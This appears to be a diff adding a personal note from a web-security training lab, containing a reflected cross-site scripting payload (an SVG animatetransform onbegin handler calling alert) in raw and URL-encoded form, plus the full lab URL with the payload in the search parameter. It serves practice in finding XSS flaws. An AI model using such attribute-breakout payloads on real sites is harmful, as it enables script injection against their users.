@@ -1,0 +1,7 @@
+
+
+
+"><svg><animatetransform onbegin=alert(1)>
+%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+
+https://0a100059036912068308c42100f400eb.h1-web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
